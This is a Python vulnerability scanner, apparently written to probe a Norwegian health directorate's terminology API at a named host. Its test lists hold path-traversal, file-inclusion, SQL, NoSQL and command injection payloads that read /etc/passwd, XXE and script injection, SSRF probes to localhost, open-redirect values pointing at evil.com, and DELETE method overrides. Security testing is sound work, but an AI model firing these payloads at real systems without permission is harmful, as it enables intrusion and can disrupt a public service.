import requests
import json
import re
import urllib.parse
import random
import string
import time
import ssl
import socket
import sys
import traceback
from concurrent.futures import ThreadPoolExecutor

# Add debug flag and output
DEBUG = True
def debug_print(message):
    if DEBUG:
        print(f"[DEBUG] {message}")

def error_print(message, exception=None):
    print(f"[ERROR] {message}")
    if exception:
        print(f"Exception details: {str(exception)}")
        traceback.print_exc()

# Use the correct base URL
BASE_URL = "https://fat.kote.helsedirektoratet.no"
debug_print(f"Using base URL: {BASE_URL}")

headers = {
    "Accept-Language": "nb",
    "Accept": "application/json"
}

def analyze_headers(url_path="/api/code-systems"):
    """Analyze HTTP response headers for security considerations"""
    url = f"{BASE_URL}{url_path}"
    debug_print(f"Analyzing headers from: {url}")
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response_headers = response.headers
        debug_print(f"Received response with status code: {response.status_code}")
        
        security_headers = {
            "Strict-Transport-Security": "Missing HSTS header",
            "Content-Security-Policy": "Missing CSP header",
            "X-Content-Type-Options": "Missing X-Content-Type-Options header",
            "X-Frame-Options": "Missing X-Frame-Options header",
            "X-XSS-Protection": "Missing X-XSS-Protection header",
            "Referrer-Policy": "Missing Referrer-Policy header",
            "Feature-Policy": "Missing Feature-Policy/Permissions-Policy header",
            "Cache-Control": "Missing Cache-Control header"
        }
        
        findings = []
        
        # Check for missing security headers
        for header, message in security_headers.items():
            if header not in response_headers:
                findings.append({
                    "type": "missing_header",
                    "header": header,
                    "description": message,
                    "risk": "Medium" if header in ["Strict-Transport-Security", "Content-Security-Policy"] else "Low"
                })
        
        # Check for server information disclosure
        if "Server" in response_headers:
            server = response_headers["Server"]
            findings.append({
                "type": "information_disclosure",
                "header": "Server",
                "value": server,
                "description": "Server header reveals server software information",
                "risk": "Low"
            })
        
        # Check for cookies without secure flags
        if "Set-Cookie" in response_headers:
            cookies = response_headers.getall("Set-Cookie")
            for cookie in cookies:
                if "HttpOnly" not in cookie:
                    findings.append({
                        "type": "insecure_cookie",
                        "description": "Cookie set without HttpOnly flag",
                        "cookie": cookie,
                        "risk": "Medium"
                    })
                if "Secure" not in cookie and "SameSite=None" in cookie:
                    findings.append({
                        "type": "insecure_cookie",
                        "description": "SameSite=None cookie without Secure flag",
                        "cookie": cookie,
                        "risk": "Medium"
                    })
        
        # Check CORS headers
        cors_headers = [h for h in response_headers.keys() if "access-control" in h.lower()]
        if cors_headers:
            cors_config = {h: response_headers[h] for h in cors_headers}
            if "Access-Control-Allow-Origin" in cors_config and cors_config["Access-Control-Allow-Origin"] == "*":
                findings.append({
                    "type": "permissive_cors",
                    "description": "CORS allows requests from any origin",
                    "cors_config": cors_config,
                    "risk": "Medium"
                })
        
        # Check for caching of sensitive information
        if "Cache-Control" in response_headers:
            cache_control = response_headers["Cache-Control"]
            if "public" in cache_control.lower() and "private" not in cache_control.lower():
                findings.append({
                    "type": "sensitive_caching",
                    "description": "Response may be cached publicly",
                    "cache_control": cache_control,
                    "risk": "Low"
                })
        
        # Additional response information
        additional_info = {
            "status_code": response.status_code,
            "response_time": response.elapsed.total_seconds(),
            "content_type": response_headers.get("Content-Type", "Unknown"),
            "content_length": response_headers.get("Content-Length", "Unknown")
        }
        
        # Check for JWT tokens in responses
        if response.text:
            jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
            jwt_matches = re.findall(jwt_pattern, response.text)
            if jwt_matches:
                findings.append({
                    "type": "information_disclosure",
                    "description": "JWT token found in response body",
                    "tokens_found": jwt_matches,
                    "risk": "High"
                })
        
        debug_print(f"Found {len(findings)} header-related issues")
        return {
            "url": url,
            "findings": findings,
            "all_headers": dict(response_headers),
            "additional_info": additional_info
        }
    except Exception as e:
        error_print(f"Error analyzing headers for {url_path}", e)
        return {
            "url": url,
            "findings": [],
            "all_headers": {},
            "additional_info": {"error": str(e)}
        }

def test_path_parameters(concept_id="1234567890"):
    """Test path parameter handling for unusual inputs"""
    debug_print("Testing path parameters...")
    
    # Standard test endpoints
    test_endpoints = [
        f"/api/medicines/clinical-drugs/{concept_id}",
        f"/api/diagnosis/icpc2/{concept_id}",
        f"/api/snomed/{concept_id}"
    ]
    
    # Path traversal tests
    traversal_tests = [
        f"/api/medicines/clinical-drugs/../../../../etc/passwd",
        f"/api/diagnosis/icpc2/..%2f..%2f..%2f..%2fetc%2fpasswd",
        f"/api/snomed/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        f"/api/code-systems/..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        f"/api/fest/merkevarer/..;/..;/..;/etc/passwd"
    ]
    
    # LFI/RFI tests
    lfi_tests = [
        f"/api/snomed/file:///etc/passwd",
        f"/api/code-systems/php://filter/convert.base64-encode/resource=/etc/passwd",
        f"/api/diagnosis/icpc2/c:\\windows\\system32\\drivers\\etc\\hosts"
    ]
    
    # SQL injection tests
    sqli_tests = [
        f"/api/medicines/clinical-drugs/'OR'1'='1",
        f"/api/diagnosis/icpc2/1' OR '1'='1",
        f"/api/snomed/1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
    ]
    
    # XML injection
    xml_tests = [
        f"/api/medicines/clinical-drugs/<script>alert(1)</script>",
        f"/api/snomed/<!DOCTYPE+xxe+[<!ENTITY+xxe+SYSTEM+\"file:///etc/passwd\">]><x>&xxe;</x>"
    ]
    
    # Combine all tests
    test_endpoints.extend(traversal_tests)
    test_endpoints.extend(lfi_tests)
    test_endpoints.extend(sqli_tests)
    test_endpoints.extend(xml_tests)
    
    findings = []
    
    for endpoint in test_endpoints:
        url = f"{BASE_URL}{endpoint}"
        debug_print(f"Testing path parameter: {url}")
        try:
            response = requests.get(url, headers=headers, timeout=10)
            
            # Check for interesting status codes other than 404
            if response.status_code not in [404, 400]:
                findings.append({
                    "type": "unexpected_response",
                    "endpoint": endpoint,
                    "status_code": response.status_code,
                    "description": f"Unexpected status code {response.status_code} for invalid concept ID",
                    "risk": "Low"
                })
                
            # Check for verbose error messages that might leak information
            if response.status_code >= 400:
                response_text = response.text
                # Look for stack traces or detailed error messages
                if any(x in response_text for x in ["stack", "exception", "System.", "Microsoft.", "line", ".cs"]):
                    excerpt = response_text[:200] + "..." if len(response_text) > 200 else response_text
                    findings.append({
                        "type": "information_disclosure",
                        "endpoint": endpoint,
                        "description": "Verbose error messages may leak implementation details",
                        "error_excerpt": excerpt,
                        "risk": "Medium"
                    })
        except Exception as e:
            error_print(f"Error testing path parameter for {endpoint}", e)
    
    debug_print(f"Found {len(findings)} path parameter issues")
    return findings

def test_large_parameters():
    """Test handling of unusually large parameter values"""
    debug_print("Testing large parameter values and injection...")
    
    test_endpoints = [
        ("/api/medicines/clinical-drugs", "pageSize", "10000"),
        ("/api/code-systems/ICD10", "pageSize", "999999"),
        ("/api/diagnosis/icpc2", "pageNumber", "999999")
    ]
    
    # Add injection tests with common parameters
    sql_injection_params = [
        ("code", "' OR '1'='1"),
        ("pageNumber", "1 OR 1=1"),
        ("conceptId", "' UNION SELECT NULL,NULL,NULL,NULL--"),
        ("includeInactive", "true' OR '1'='1"),
        ("Accept-Language", "nb' OR '1'='1' --")
    ]
    
    # NoSQL injection tests
    nosql_injection_params = [
        ("pageSize", "{'$gt': 0}"),
        ("pageNumber", "{'$ne': null}"),
        ("code", "{$where: 'sleep(1000)'}"),
        ("conceptId", "' || 1==1 || '")
    ]
    
    # Command injection tests
    command_injection_params = [
        ("pageSize", "$(cat /etc/passwd)"),
        ("pageNumber", "`cat /etc/passwd`"),
        ("code", "|| cat /etc/passwd"),
        ("conceptId", "& ping -c 10 127.0.0.1 &")
    ]
    
    # Add these tests to our list
    for endpoint in ["/api/medicines/clinical-drugs", "/api/code-systems/ICD10", "/api/diagnosis/icpc2"]:
        for param, value in sql_injection_params:
            test_endpoints.append((endpoint, param, value))
        for param, value in nosql_injection_params:
            test_endpoints.append((endpoint, param, value))
        for param, value in command_injection_params:
            test_endpoints.append((endpoint, param, value))
    
    findings = []
    
    for endpoint, param, value in test_endpoints:
        url = f"{BASE_URL}{endpoint}"
        params = {param: value}
        debug_print(f"Testing parameter {param}={value} on {endpoint}")
        
        try:
            response = requests.get(url, headers=headers, params=params, timeout=10)
            
            # Check if the API returns a proper error for excessive values
            if response.status_code == 200:
                findings.append({
                    "type": "parameter_validation",
                    "endpoint": endpoint,
                    "parameter": param,
                    "value": value,
                    "description": f"Endpoint accepts unusually large value for {param} without error",
                    "risk": "Low"
                })
                
            # Check for interesting error messages
            if response.status_code >= 400:
                if any(x in response.text.lower() for x in ["sql", "database", "syntax", "error", "exception"]):
                    findings.append({
                        "type": "potential_injection",
                        "endpoint": endpoint,
                        "parameter": param,
                        "value": value,
                        "description": "Potential injection vulnerability detected",
                        "status_code": response.status_code,
                        "error_preview": response.text[:200] + "..." if len(response.text) > 200 else response.text,
                        "risk": "High"
                    })
        except requests.exceptions.Timeout:
            findings.append({
                "type": "timeout",
                "endpoint": endpoint,
                "parameter": param,
                "value": value,
                "description": "Request timed out, possible injection or DoS vulnerability",
                "risk": "Medium"
            })
        except Exception as e:
            error_print(f"Error testing parameter {param}={value} on {endpoint}", e)
    
    debug_print(f"Found {len(findings)} parameter handling issues")
    return findings

def test_parameter_pollution(endpoint, param_name, orig_value):
    """Test for HTTP Parameter Pollution issues"""
    url = f"{BASE_URL}{endpoint}"
    debug_print(f"Testing parameter pollution for {param_name} on {endpoint}")
    findings = []
    
    # Create a base request to compare against
    params = {param_name: orig_value}
    try:
        base_response = requests.get(url, headers=headers, params=params, timeout=10)
        
        if base_response.status_code != 200:
            debug_print(f"Base request for {endpoint} returned {base_response.status_code}, skipping pollution test")
            return []  # Skip if base request doesn't work
        
        # Test case 1: Duplicate parameter with same value
        params_dup_same = {param_name: [orig_value, orig_value]}
        try:
            response1 = requests.get(url, headers=headers, params=params_dup_same, timeout=10)
            
            if response1.status_code == 200 and response1.content == base_response.content:
                findings.append({
                    "type": "parameter_pollution",
                    "parameter": param_name,
                    "description": "Endpoint accepts duplicate parameters with same value",
                    "test": "duplicate_same",
                    "risk": "Low"
                })
        except Exception as e:
            error_print(f"Error testing duplicate parameters with same value: {param_name} on {endpoint}", e)
        
        # Test case 2: Duplicate parameter with different values
        if orig_value.isdigit():
            alt_value = str(int(orig_value) + 1)
        else:
            alt_value = orig_value + "_alt"
        
        params_dup_diff = {param_name: [orig_value, alt_value]}
        try:
            response2 = requests.get(url, headers=headers, params=params_dup_diff, timeout=10)
            
            if response2.status_code == 200 and response2.content != base_response.content:
                findings.append({
                    "type": "parameter_pollution",
                    "parameter": param_name,
                    "description": "Endpoint behavior changes with duplicate parameters of different values",
                    "test": "duplicate_different",
                    "risk": "Medium"
                })
        except Exception as e:
            error_print(f"Error testing duplicate parameters with different values: {param_name} on {endpoint}", e)
    except Exception as e:
        error_print(f"Error making base request for parameter pollution test: {param_name} on {endpoint}", e)
    
    return findings

def test_race_conditions():
    """Test for potential race conditions by making concurrent requests"""
    debug_print("Testing for race conditions...")
    test_endpoints = [
        "/api/medicines/clinical-drugs",
        "/api/code-systems",
        "/api/diagnosis/icpc2"
    ]
    
    findings = []
    
    for endpoint in test_endpoints:
        url = f"{BASE_URL}{endpoint}"
        debug_print(f"Testing race conditions on {endpoint}")
        
        # Make 5 concurrent requests (reduced from 10 to be gentler on the API)
        responses = []
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(requests.get, url, headers=headers, timeout=10) for _ in range(5)]
            
            for future in futures:
                try:
                    responses.append(future.result())
                except Exception as e:
                    error_print(f"Error during concurrent request to {endpoint}", e)
        
        # Check for inconsistent status codes
        status_codes = [r.status_code for r in responses]
        if len(set(status_codes)) > 1:
            findings.append({
                "type": "race_condition",
                "endpoint": endpoint,
                "description": "Inconsistent status codes when making concurrent requests",
                "status_codes": status_codes,
                "risk": "Medium"
            })
        
        # Check for 500 errors or timeouts
        if 500 in status_codes:
            findings.append({
                "type": "race_condition",
                "endpoint": endpoint,
                "description": "500 error when making concurrent requests",
                "status_codes": status_codes,
                "risk": "Medium"
            })
    
    debug_print(f"Found {len(findings)} race condition issues")
    return findings

def test_http_method_override():
    """Test HTTP method override techniques"""
    debug_print("Testing HTTP method override techniques...")
    findings = []
    endpoints = [
        "/api/code-systems",
        "/api/medicines/clinical-drugs",
        "/api/diagnosis/icpc2"
    ]
    
    for endpoint in endpoints:
        url = f"{BASE_URL}{endpoint}"
        debug_print(f"Testing method override on {endpoint}")
        
        # Test POST with X-HTTP-Method-Override header
        override_headers = headers.copy()
        override_headers["X-HTTP-Method-Override"] = "DELETE"
        
        try:
            response = requests.post(url, headers=override_headers, timeout=10)
            
            if response.status_code not in [400, 404, 405]:
                findings.append({
                    "type": "method_override",
                    "endpoint": endpoint,
                    "description": "Server may accept X-HTTP-Method-Override header",
                    "status_code": response.status_code,
                    "risk": "Medium"
                })
        except Exception as e:
            error_print(f"Error testing X-HTTP-Method-Override on {endpoint}", e)
        
        # Test with _method parameter
        params = {"_method": "DELETE"}
        try:
            response = requests.post(url, headers=headers, params=params, timeout=10)
            
            if response.status_code not in [400, 404, 405]:
                findings.append({
                    "type": "method_override",
                    "endpoint": endpoint,
                    "description": "Server may accept _method parameter for method override",
                    "status_code": response.status_code,
                    "risk": "Medium"
                })
        except Exception as e:
            error_print(f"Error testing _method parameter on {endpoint}", e)
    
    debug_print(f"Found {len(findings)} HTTP method override issues")
    return findings

def test_ssrf_vulnerabilities():
    """Test for Server-Side Request Forgery (SSRF) vulnerabilities"""
    debug_print("Testing for SSRF vulnerabilities...")
    findings = []
    # Limit test parameters to reduce load on the server
    test_params = {
        "url": "http://localhost:22",
        "callback": "http://localhost/admin"
    }
    
    endpoints = [
        "/api/code-systems",
        "/api/medicines/clinical-drugs"
    ]
    
    for endpoint in endpoints:
        url = f"{BASE_URL}{endpoint}"
        debug_print(f"Testing SSRF on {endpoint}")
        
        for param_name, param_value in test_params.items():
            # Test GET
            try:
                params = {param_name: param_value}
                response = requests.get(url, headers=headers, params=params, timeout=5)
                debug_print(f"  Testing parameter {param_name}={param_value} (GET)")
                
                if response.status_code != 404:  # Parameter not found should return 404
                    findings.append({
                        "type": "possible_ssrf",
                        "endpoint": endpoint,
                        "parameter": param_name,
                        "value": param_value,
                        "method": "GET",
                        "status_code": response.status_code,
                        "risk": "High"
                    })
            except requests.exceptions.Timeout:
                # Timeout might indicate successful SSRF
                findings.append({
                    "type": "possible_ssrf_timeout",
                    "endpoint": endpoint,
                    "parameter": param_name,
                    "value": param_value,
                    "method": "GET",
                    "description": "Request timed out, possible SSRF vulnerability",
                    "risk": "High"
                })
            except Exception as e:
                error_print(f"Error testing SSRF with GET {param_name}={param_value} on {endpoint}", e)
            
            # Test POST
            try:
                data = {param_name: param_value}
                debug_print(f"  Testing parameter {param_name}={param_value} (POST)")
                response = requests.post(url, headers=headers, json=data, timeout=5)
                
                if response.status_code not in [404, 405]:  # Not found or method not allowed
                    findings.append({
                        "type": "possible_ssrf",
                        "endpoint": endpoint,
                        "parameter": param_name,
                        "value": param_value,
                        "method": "POST",
                        "status_code": response.status_code,
                        "risk": "High"
                    })
            except requests.exceptions.Timeout:
                findings.append({
                    "type": "possible_ssrf_timeout",
                    "endpoint": endpoint,
                    "parameter": param_name,
                    "value": param_value,
                    "method": "POST",
                    "description": "Request timed out, possible SSRF vulnerability",
                    "risk": "High"
                })
            except Exception as e:
                error_print(f"Error testing SSRF with POST {param_name}={param_value} on {endpoint}", e)
    
    debug_print(f"Found {len(findings)} potential SSRF issues")
    return findings

def test_open_redirect():
    """Test for open redirect vulnerabilities"""
    debug_print("Testing for open redirect vulnerabilities...")
    findings = []
    # Limit parameters to reduce load
    redirect_params = ["redirect", "url"]
    redirect_values = [
        "https://evil.com",
        "//evil.com"
    ]
    
    endpoints = [
        "/api/code-systems",
        "/api/medicines/clinical-drugs"
    ]
    
    for endpoint in endpoints:
        url = f"{BASE_URL}{endpoint}"
        debug_print(f"Testing open redirect on {endpoint}")
        
        for param in redirect_params:
            for value in redirect_values:
                params = {param: value}
                try:
                    debug_print(f"  Testing parameter {param}={value}")
                    response = requests.get(url, headers=headers, params=params, allow_redirects=False, timeout=10)
                    
                    # Check for 3xx redirect
                    if 300 <= response.status_code < 400:
                        location = response.headers.get("Location", "")
                        if value in location or "evil.com" in location:
                            findings.append({
                                "type": "open_redirect",
                                "endpoint": endpoint,
                                "parameter": param,
                                "value": value,
                                "redirect_location": location,
                                "risk": "Medium"
                            })
                except Exception as e:
                    error_print(f"Error testing open redirect with {param}={value} on {endpoint}", e)
    
    debug_print(f"Found {len(findings)} open redirect issues")
    return findings

def analyze_cache_behavior():
    """Analyze API caching behavior using ETag headers"""
    debug_print("Analyzing cache behavior...")
    test_endpoints = [
        "/api/medicines/clinical-drugs",
        "/api/code-systems",
        "/api/diagnosis/icpc2"
    ]
    
    findings = []
    
    for endpoint in test_endpoints:
        url = f"{BASE_URL}{endpoint}"
        debug_print(f"Testing cache behavior on {endpoint}")
        
        # Make initial request
        try:
            response1 = requests.get(url, headers=headers, timeout=10)
            
            if "ETag" in response1.headers:
                etag = response1.headers["ETag"]
                debug_print(f"  Found ETag: {etag}")
                
                # Make second request with If-None-Match header
                if_none_match_headers = headers.copy()
                if_none_match_headers["If-None-Match"] = etag
                
                response2 = requests.get(url, headers=if_none_match_headers, timeout=10)
                
                # Check if server respects ETags properly
                if response2.status_code != 304:  # Not Modified
                    findings.append({
                        "type": "caching_issue",
                        "endpoint": endpoint,
                        "description": "Server provides ETag but doesn't properly support conditional requests",
                        "etag": etag,
                        "second_response_code": response2.status_code,
                        "risk": "Low"
                    })
                    
            # If no ETag, check for Last-Modified
            elif "Last-Modified" in response1.headers:
                last_modified = response1.headers["Last-Modified"]
                debug_print(f"  Found Last-Modified: {last_modified}")
                
                # Make second request with If-Modified-Since header
                if_modified_headers = headers.copy()
                if_modified_headers["If-Modified-Since"] = last_modified
                
                response2 = requests.get(url, headers=if_modified_headers, timeout=10)
                
                # Check if server respects Last-Modified properly
                if response2.status_code != 304:  # Not Modified
                    findings.append({
                        "type": "caching_issue",
                        "endpoint": endpoint,
                        "description": "Server provides Last-Modified but doesn't properly support conditional requests",
                        "last_modified": last_modified,
                        "second_response_code": response2.status_code,
                        "risk": "Low"
                    })
        except Exception as e:
            error_print(f"Error testing cache behavior on {endpoint}", e)
    
    debug_print(f"Found {len(findings)} cache-related issues")
    return findings

def test_tls_configuration():
    """Test TLS configuration for security issues"""
    debug_print("Testing TLS configuration...")
    findings = []
    hostname = BASE_URL.split("//")[1].split("/")[0]
    debug_print(f"Testing TLS for hostname: {hostname}")
    
    try:
        # Check if TLS 1.0 or 1.1 is supported (less secure)
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
        try:
            conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)
            conn.connect((hostname, 443))
            findings.append({
                "type": "weak_tls",
                "description": "Server supports TLS 1.0, which is deprecated",
                "risk": "Medium"
            })
            debug_print("  Server supports TLS 1.0 (deprecated)")
        except:
            debug_print("  Server does not support TLS 1.0 (good)")
        
        # Check for secure cipher suites
        context = ssl.create_default_context()
        conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)
        conn.connect((hostname, 443))
        cipher = conn.cipher()
        debug_print(f"  Current cipher: {cipher[0]}")
        
        # Check if weak ciphers are used
        weak_ciphers = ["RC4", "DES", "NULL", "MD5", "SHA1"]
        if any(weak in cipher[0] for weak in weak_ciphers):
            findings.append({
                "type": "weak_cipher",
                "description": f"Server supports weak cipher: {cipher[0]}",
                "cipher": cipher,
                "risk": "Medium"
            })
            debug_print(f"  Weak cipher detected: {cipher[0]}")
    except Exception as e:
        error_print("Error testing TLS configuration", e)
        findings.append({
            "type": "tls_test_error",
            "description": f"Error testing TLS configuration: {str(e)}",
            "risk": "Low"
        })
    
    debug_print(f"Found {len(findings)} TLS-related issues")
    return findings

def run_security_analysis():
    """Run all security analysis functions and compile results"""
    all_findings = []
    
    print("Starting comprehensive security analysis...")
    
    # 1. Analyze response headers
    print("Analyzing HTTP response headers...")
    try:
        header_analysis = analyze_headers()
        all_findings.extend(header_analysis.get("findings", []))
    except Exception as e:
        error_print("Error in header analysis", e)
    
    # 1.5. Test TLS configuration
    print("Testing TLS configuration...")
    try:
        tls_findings = test_tls_configuration()
        all_findings.extend(tls_findings)
    except Exception as e:
        error_print("Error testing TLS configuration", e)
    
    # 2. Test for path parameter handling issues
    print("Testing path parameter handling...")
    try:
        path_findings = test_path_parameters()
        all_findings.extend(path_findings)
    except Exception as e:
        error_print("Error testing path parameters", e)
    
    # 3. Test for large parameter handling and injection
    print("Testing parameter handling and injection vectors...")
    try:
        param_size_findings = test_large_parameters()
        all_findings.extend(param_size_findings)
    except Exception as e:
        error_print("Error testing parameter handling", e)
    
    # 4. Test pagination parameters for pollution
    print("Testing parameter pollution...")
    try:
        poll_findings = []
        pagination_endpoints = [
            ("/api/medicines/clinical-drugs", "pageNumber", "1"),
            ("/api/medicines/clinical-drugs", "pageSize", "10"),
            ("/api/diagnosis/icpc2", "pageNumber", "1"),
            ("/api/diagnosis/icpc2", "pageSize", "10")
        ]
        
        for endpoint, param, value in pagination_endpoints:
            poll_findings.extend(test_parameter_pollution(endpoint, param, value))
        
        all_findings.extend(poll_findings)
    except Exception as e:
        error_print("Error testing parameter pollution", e)
    
    # 5. Test for race conditions
    print("Testing for race conditions...")
    try:
        race_findings = test_race_conditions()
        all_findings.extend(race_findings)
    except Exception as e:
        error_print("Error testing race conditions", e)
    
    # 6. Test for HTTP method override vulnerabilities
    print("Testing HTTP method override techniques...")
    try:
        method_override_findings = test_http_method_override()
        all_findings.extend(method_override_findings)
    except Exception as e:
        error_print("Error testing HTTP method override", e)
    
    # 7. Test for SSRF vulnerabilities
    print("Testing for SSRF vulnerabilities...")
    try:
        ssrf_findings = test_ssrf_vulnerabilities()
        all_findings.extend(ssrf_findings)
    except Exception as e:
        error_print("Error testing SSRF vulnerabilities", e)
    
    # 8. Test for open redirect vulnerabilities
    print("Testing for open redirect vulnerabilities...")
    try:
        redirect_findings = test_open_redirect()
        all_findings.extend(redirect_findings)
    except Exception as e:
        error_print("Error testing open redirect", e)
    
    # 9. Analyze cache behavior
    print("Analyzing cache behavior...")
    try:
        cache_findings = analyze_cache_behavior()
        all_findings.extend(cache_findings)
    except Exception as e:
        error_print("Error analyzing cache behavior", e)
    
    # Generate summary
    risk_counts = {"High": 0, "Medium": 0, "Low": 0}
    finding_types = {}
    
    for finding in all_findings:
        risk = finding.get("risk", "Low")
        risk_counts[risk] = risk_counts.get(risk, 0) + 1
        
        finding_type = finding.get("type", "unknown")
        if finding_type in finding_types:
            finding_types[finding_type] += 1
        else:
            finding_types[finding_type] = 1
    
    summary = {
        "total_findings": len(all_findings),
        "risk_summary": risk_counts,
        "finding_types": finding_types,
        "header_analysis": {
            "url": header_analysis.get("url") if 'header_analysis' in locals() else None,
            "additional_info": header_analysis.get("additional_info") if 'header_analysis' in locals() else None
        }
    }
    
    # Save results
    try:
        results = {
            "summary": summary,
            "findings": all_findings,
            "all_headers": header_analysis.get("all_headers") if 'header_analysis' in locals() else {}
        }
        
        with open("security_analysis_results.json", "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2)
        
        print("\nSecurity Analysis Complete")
        print(f"Total findings: {len(all_findings)}")
        print("Risk summary:")
        for risk, count in risk_counts.items():
            print(f"- {risk}: {count}")
        print("\nFinding types:")
        for f_type, count in finding_types.items():
            print(f"- {f_type}: {count}")
        
        print(f"\nResults saved to security_analysis_results.json")
    except Exception as e:
        error_print("Error saving results", e)
    
    return results

if __name__ == "__main__":
    print("Starting security analysis of Helsedirektoratet API...")
    try:
        run_security_analysis()
    except Exception as e:
        error_print("Fatal error in security analysis", e)
        traceback.print_exc()
    print("Analysis script completed execution.")